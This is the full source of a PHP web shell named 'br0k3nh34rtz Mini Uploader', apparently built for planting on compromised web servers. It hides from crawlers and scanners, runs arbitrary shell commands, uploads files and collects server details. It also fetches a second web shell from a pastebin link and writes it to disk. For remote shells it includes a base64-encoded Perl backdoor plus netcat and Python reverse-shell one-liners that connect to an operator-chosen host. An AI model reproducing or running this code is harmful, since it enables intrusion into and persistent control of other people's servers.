               <?php

          // #####################################################################################################################
          // br0k3nh34rtz Mini Uploader v.01
          // Created by : br0k3nh34rtz
          // Feature    : - Undorkingable ( we dont allow user agent of common search engine and shell scanner to crawl us :p )
          //              - Login ( if someone find this shell, they have to login to enter in )
          //              - Auto Download IDXShellV3
          //              - BackConnect perl,netcat,bash ( all of these need a enable shell function to be performed )
          //              - Unbreakable by waf ( we only use post method to perform command shell and upload )
          // And many more ( haven't made yet )
          // Thanks To : - IndoXploit - Garuda Security Hacker - Z3roSec - And other hacker teams in around the world
          // #####################################################################################################################

          @session_start();
          @error_reporting(0);

          $password = "54ddc3c7d064822eed932015d8740336"; //default : broken
          $current  = getcwd();
          $docroot  = $_SERVER["DOCUMENT_ROOT"];
          $perl_bc  = "
          IyEvdXNyL2Jpbi9wZXJsCnVzZSBJTzo6U29ja2V0OwojY09OTkVDVCBCQUNLRE9PUiBFRElURUQgQlkgWE9ST04KI2xvcmRAU2xhY2t3YXJlTGludXg6L2hvbWUvcHJvZ3JhbWluZyQgcGVybCBkYy5wbAojLS09PSBDb25uZWN0QmFjayBCYWNrZG9vciBTaGVsbCB2cyAxLjAgYnkgTG9yRCBvZiBJUkFOIEhBQ0tFUlMgU0FCT1RBR0UgPT0tLQojCiNVc2FnZTogZGMucGwgW0hvc3RdIFtQb3J0XQojCiNFeDogZGMucGwgMTI3LjAuMC4xIDIxMjEKI2xvcmRAU2xhY2t3YXJlTGludXg6L2hvbWUvcHJvZ3JhbWluZyQgcGVybCBkYy5wbCAxMjcuMC4wLjEgMjEyMQojLS09PSBDb25uZWN0QmFjayBCYWNrZG9vciBTaGVsbCBFRElURUQgQlkgWE9ST04gVFVSSz9TSCBIQUNLRVIgPT0tLQojCiNbKl0gUmVzb2x2aW5nIEhvc3ROYW1lCiNbKl0gQ29ubmVjdGluZy4uLiAxMjcuMC4wLjEKI1sqXSBTcGF3bmluZyBTaGVsbAojWypdIENvbm5lY3RlZCB0byByZW1vdGUgaG9zdAoKI2Jhc2gtMi4wNWIjIG5jIC12diAtbCAtcCAyMTIxCiNsaXN0ZW5pbmcgb24gW2FueV0gMjEyMSAuLi4KI2Nvbm5lY3QgdG8gWzEyNy4wLjAuMV0gZnJvbSBsb2NhbGhvc3QgWzEyNy4wLjAuMV0gMzI3NjkKIy0tPT0gQ29ubmVjdEJhY2sgQmFja2Rvb3IgU2hlbGwgRURJVEVEIEJZIFhPUk9OIFRVUks/U0ggSEFDS0VSID09LS0KIwojLS09PVN5c3RlbWluZm89PS0tCiNMaW51eCBTbGFja3dhcmVMaW51eCAyLjYuNyAjMSBTTVAgVGh1IERlYyAyMyAwMDowNTozOSBJUlQgMjAwNCBpNjg2IHVua25vd24gdW5rbm93biBHTlUvTGludXgKIwojLS09PVVzZXJpbmZvPT0tLQojdWlkPTEwMDEoeG9yb24pIGdpZD0xMDAodXNlcnMpIGdyb3Vwcz0xMDAodXNlcnMpCiMKIy0tPT1EaXJlY3Rvcnk9PS0tCiMvcm9vdAojCiMtLT09U2hlbGw9PS0tCiMKJHN5c3RlbSA9ICcvYmluL3NoJzsKJEFSR0M9QEFSR1Y7CnByaW50ICItLT09IENvbm5lY3RCYWNrIEJhY2tkb29yIFNoZWxsIEVESVRFRCBCWSBYT1JPTiBUVVJLP1NIIEhBQ0tFUiA9PS0tIFxuXG4iOwppZiAoJEFSR0MhPTIpIHsKcHJpbnQgIlVzYWdlOiAkMCBbSG9zdF0gW1BvcnRdIFxuXG4iOwpkaWUgIkV4OiAkMCAxMjcuMC4wLjEgMjEyMSBcbiI7Cn0KdXNlIFNvY2tldDsKdXNlIEZpbGVIYW5kbGU7CnNvY2tldChTT0NLRVQsIFBGX0lORVQsIFNPQ0tfU1RSRUFNLCBnZXRwcm90b2J5bmFtZSgndGNwJykpIG9yIGRpZSBwcmludCAiWy1dIFVuYWJsZSB0byBSZXNvbHZlIEhvc3RcbiI7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbigkQVJHVlsxXSwgaW5ldF9hdG9uKCRBUkdWWzBdKSkpIG9yIGRpZSBwcmludCAiWy1dIFVuYWJsZSB0byBDb25uZWN0IEhvc3RcbiI7CnByaW50ICJbKl0gUmVzb2x2aW5nIEhvc3ROYW1lXG4iOwpwcmludCAiWypdIENvbm5lY3RpbmcuLi4gJEFSR1ZbMF0gXG4iOwpwcmludCAiWypdIFNwYXduaW5nIFNoZWxsIFxuIjsKcHJpbnQgIlsqXSBDb25uZWN0ZWQgdG8gcmVtb3RlIGhvc3QgXG4iOwpTT0NLRVQtPmF1dG9mbHVzaCgpOwpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsKb3BlbihTVERPVVQsIj4mU09DS0VUIik7Cm9wZW4oU1RERVJSLCI+JlNPQ0tFVCIpOwpwcmludCAiLS09PSBDb25uZWN0QmFjayBCYWNrZG9vciBTaGVsbCBFRElURUQgQlkgWE9ST04gVFVSSz9TSCBIQUNLRVIgPT0tLSBcblxuIjsKc3lzdGVtKCJ1bnNldCBISVNURklMRTsgdW5zZXQgU0FWRUhJU1Q7ZWNobyAtLT09U3lzdGVtaW5mbz09LS07IHVuYW1lIC1hO2VjaG87CmVjaG8gLS09PVVzZXJpbmZvPT0tLTsgaWQ7ZWNobztlY2hvIC0tPT1EaXJlY3Rvcnk9PS0tOyBwd2Q7ZWNobzsgZWNobyAtLT09U2hlbGw9PS0tICIpOwpzeXN0ZW0oJHN5c3RlbSk7CiNFT0Y=
          ";

          if(!empty($_SERVER['HTTP_USER_AGENT'])) {
              $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl", "google");
              if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
                  header('HTTP/1.0 404 Not Found');
                  exit;
              }
          }
          function login(){ //login function
          ?>

          <!DOCTYPE html>
          <html>
          <head>
          	<title> br0k3nh34rtz &hearts; </title>
          	<style>
          		body{
          			margin-top:10%;
          			font-style: italic;
          			background-color:black;
          			color:green;
          		}
          		p{
          			font-size:250%;
          		}
          		form input[type=password]{
          			background: transparent;
          			color:red;
          			text-align: center;
          			border: 1px dotted green;
                         border-radius:3px;
          			padding:7px 12px;
          		}
          	</style>
          </head>
          <body>
          	<center>
          		<p>
          			&hearts; br0k3nh34rtz &hearts;
          		</p>
          		<form action="" method="POST">
          			<input type="password" name="pass" placeholder="show me who you are">
          		</form>
          	</center>
          </body>
          </html>

          <?php
          exit;
          }

          function check($program){ //check enabled and disabled library
               switch($program){
                    case "mysql":
                         return (function_exists("mysqli_connect") or function_exists("mysql_connect"))?
                         "<font color=\"yellow\">ON</font>":"<font color=\"red\">OFF</foont>>";
                         break;
                    case "curl":
                         return (function_exists("curl_version"))?"<font color=\"yellow\">ON</font>":"<font color=\"red\">OFF</font>";
                         break;
                    case "python":
                         return (@exec("python --help"))?"<font color=\"yellow\">ON</font>":"<font color=\"red\">OFF</font>";
                         break;
                    case "perl":
                         return (@shell_exec("perl --help"))?"<font color=\"yellow\">ON</font>":"<font color=\"red\">OFF</font>";
                         break;
                    case "wget":
                         return (@exec("wget --help"))?"<font color=\"yellow\">ON</font>":"<font color=\"red\">OFF</font>";
                         break;
                    case "netcat" :
                         return (@shell_exec("ls /bin/nc")) ? "<font color='yellow'>ON</font>" : "<font color='red'>OFF</font>";
                    default:
                         return "there's no function as u input!";
               }
          }

          function shell_func_detector(){
               $shell_func = array( //list of shell functions
                    "shell_exec",
                    "system",
                    "exec",
                    "passthru",
               );
               $allowed_shell_func = array();
               foreach($shell_func as $shell){ //detect allowed function
                    if(!function_exists($shell)):
                         continue;
                    endif;
                    $allowed_shell_func[] = $shell; //if its allowed, it'll be stored in array
               }
               return $allowed_shell_func; //return allowed shell func
          }

          function shell_execute($shell,$command){ //executing command shell
               return "<pre>" . $shell($command) . "</pre>";
          }

          function info(){ //give you fcking all informations about target
            $shell_func = ( !count(shell_func_detector()) == 0 ) ? implode(" , ",shell_func_detector()) : "all disabled!";
          	$info   = array();
            $info[] = "YOUR IP            : " . $_SERVER["REMOTE_ADDR"];
          	$info[] = "SERVER IP / DOMAIN : " . @gethostbyname($_SERVER["SERVER_NAME"]) . " / " . $_SERVER["SERVER_NAME"];
          	$info[] = "WEB SERVER    	   : " . $_SERVER["SERVER_SOFTWARE"];
          	$info[] = "SERVER SYSTEM      : " . @php_uname();
          	$info[] = "PHP VERSION        : " . @phpversion();
          	$info[] = "SHELL FUNCTION     : " . $shell_func;
          	$info[] = "LIB INSTALLED      : " . "PYTHON : " . check("python") . " | " . "PERL : " . check("perl")  . " | " . "WGET : " . check("wget") . " | " . "CURL : " . check("curl") . " | " .  "MYSQL : " . check("mysql") . " | " . "NETCAT : " . check("netcat");
          	return $info;
          }

          function disfunc(){ //list of disable functions
          	$disfunc = @ini_get("disable_functions");
          	$disfunc = explode(",",$disfunc);
          	return $disfunc;
          }

          function exec_uploader($file,$dir){ //for performing uploading file
               global $docroot;
               $tmp      = $file["tmp_name"];
               $dest     = $dir . "/" . $file["name"];
               $uploaded = str_replace($docroot,$_SERVER["HTTP_HOST"],$dest);
               if( move_uploaded_file($tmp,$dest) ){
                    return "<font color=\"yellow\">uploaded <a href='http://$uploaded'>http:// $uploaded</a> !</font>";
               }else{
                    return "<font color=\"red\">unuploaded!</font>";
               }
          }

          function download_shell(){ //indoxploit shell v3 download function
               global $current; global $docroot;
               $access = str_replace($docroot,$_SERVER["HTTP_HOST"],$current) . "/idx.php";
               $curl   = curl_init();
               curl_setopt($curl, CURLOPT_URL, "https://pastebin.com/raw/XSaUr3Up");
               curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
               curl_setopt($curl, CURLOPT_BINARYTRANSFER, true);
               curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
               curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
               $exec = curl_exec($curl); curl_close($curl);
               if($exec){
                    $idxShell = fopen($current . "/idx.php","w");
                    fwrite($idxShell, $exec);
                    fclose($idxShell);
                    if( file_exists($current . "/idx.php") ){
                         echo "Here you are <a href='http://" . $access . "'> http://$access !";
                    }else{
                         echo "berhasil download, tapi gagal bikin file hehe";
                         echo "<br>";
                         echo "paling dirnya ga writeable atau gimana";
                    }
               }else{
                    echo "gagal download filena";
               }
          }

          function back_connect($x,$host,$port){
               global $perl_bc;
               switch($x){
                    case "perl":
                         if( !file_exists("/tmp/bc.pl") ){
                              $bc = fopen("/tmp/bc.pl","w+");
                              fwrite($bc,base64_decode($perl_bc));
                              fclose($bc);
                         }
                         $command = "perl /tmp/bc.pl $host $port";
                         echo shell_execute(shell_func_detector()[0],$command);
                         break;
                    case "netcat":
                         $command = "netcat -e /bin/bash $host $port";
                         echo shell_execute(shell_func_detector()[0],$command);
                         break;
                    case "python":
                         $command = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
                         echo shell_execute(shell_func_detector()[0],$command);
                         break;
                    default :
                         echo "";
                         break;
               }
          }

          if( isset($_POST["pass"]) && md5($_POST["pass"]) === $password){
          	$_SESSION["user"] = 1;
          }

          if(isset($_SESSION["user"])){
          	"";
          }else{
          	login();
          }
          ?>

          <!--
          # made by love, sadness, and any other else which is combined and become the one of kinda feeling that can't be said #
          -->

          <!DOCTYPE html>
          <html>
          <head>
          	<title>
          		br0k3nh34rtz &hearts;
          	</title>
          	 <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
          	<style>
          		body,header,nav,footer{margin:auto;width:83%;}
          		body{
          			background-color:black;
          			font-family:"Ubuntu", monospace;
          			font-size:14px;
          			color:green;
          		}
          		header{
          			border-style:none none solid none;
          			padding:1.5% 1.5%;
          		}
          		header h1 em{color:red;font-size:35px;margin-left:2%;}
          		header h1{font-style:italic;text-transform: capitalize;}
          		header form.command{margin:1.3% 0%;}
                    header form.upload_file{margin:1.3% 0%;}
          		header form.command input,form.upload_file input,form.back_connect input{
          			background:transparent;
          			border-style: none none solid none;
          			border-width: 1.9px;
                         border-color:green;
                         color:yellow;
          		}
                    header form.back_connect select{ padding:0.5% 3.1% }
          		header form.upload_file select,form.back_connect select{
          			color:yellow;
          			border:none;
          			padding:0.5% 1.5%;
          			border-style:none none solid none;
          			border-color:green;
          			border-width:1px;
          			border-radius:2.5px;
          		}
          		nav{
          			padding:2% 1.5%;
          			text-align:center;
          			border-style:none none solid none;
          		}
          		nav a{display:inline-block;margin-left:3.2%;text-decoration: none;color:yellow;}
          		nav a:hover{color:white;font-size:14.2px;}
          		main{margin:auto;width:85%;}
          		main{margin-top:2%;}
          		main em{color:red;font-size:14.5px;}
                    main a{color:yellow;text-decoration:none;}
                    main a:hover{color:white;}
          	</style>
          </head>
          <body>
          	<header>
          		<h1> br0k3n mini uploader <em>&hearts;</em> </h1>
          		<form action="?do=cmd" method="POST" class="command">
          			<input type="text" name="command" placeholder="command">
          			<input type="submit" value="+>>">
          		</form>
                    <form action="?do=up" method="POST" class="upload_file" enctype="multipart/form-data">
                         <select name="dir">
                              <option value="<?= $docroot ?>">home_root</option>
                              <option value="<?= $current ?>">current_dir</option>
                         </select>
                         <input type="file" name="file_upload">
                         <input type="submit" name="submit" value="+>>">
                    </form>
                    <form action="?do=bc" method="POST" class="back_connect">
                         <select name="x">
                              <option value="perl">perl</option>
                              <option value="netcat">netcat</option>
                              <option value="python">python</option>
                         </select>
                         <input type="text" name="ip" placeholder="listening ip">
                         <input type="text" name="port" size="20" placeholder="listening port">
                         <input type="submit" name="submit" value="+>>">
                    </form>
          	</header>
          	<nav>
          		<a href="?x=bhh"> [ idx_shell ] </a>
          		<a href="?x=disfunc"> [ disable_functions ] </a>
          		<a href="?x=info"> [ server_info ] </a>
          		<a href="?x=logout"> [ get_fucking_out ] </a>
          	</nav>
          	<main>
          		<?php
          		if(isset($_GET["x"])){
          			switch($_GET["x"]){
          				case "logout":
          					session_destroy();
          					unset($_SESSION);
          					header("Refresh: 0; " . $_SERVER["PHP_SELF"]);
          					break;
          				case "info":
          					echo "<pre>";
          					foreach( info() as $x ){
          						echo $x . "<br>";
          					}
          					echo "</pre>";
          					break;
          				case "disfunc":
          					foreach( disfunc() as $x){
          						echo "<em>" . $x . "</em>" . " , ";
          					}
          					break;
                  case "bhh":
                    download_shell();
                    break;
          				default :
          					echo "Do what you wanna do, boy!";
          					break;
          			}
          		}elseif( isset($_GET["do"]) ){
                         if($_GET["do"] === "up"){
                              if( isset($_POST["submit"]) ){
                                   echo exec_uploader($_FILES["file_upload"],$_POST["dir"]);
                              }else{
                                   echo "pengen upload file ga si lo cok?!";
                              }
                         }
          			if($_GET["do"] === "cmd"){
          				if( count(shell_func_detector()) < 1){
          					echo "gabisa, gaada fungsi shell yang enabled!";
          				}else{
          					echo shell_execute(shell_func_detector()[0],$_POST["command"]);
          				}
          			}
                         if($_GET["do"] === "bc"){
                              if( isset($_POST["submit"]) ):
                                   if( count(shell_func_detector()) < 1 ){
                                        echo "gabisa, gaada fungsi shell yang enabled!";
                                   }else{
                                        if( isset($_POST["submit"]) ){
                                             back_connect($_POST["x"],$_POST["ip"],$_POST["port"]);
                                        }
                                   }
                              endif;
                         }
          		}else{
                         echo "Do what you wanna do, boy!";
                    }
          		?>

          	</main>
          </body>
          </html>
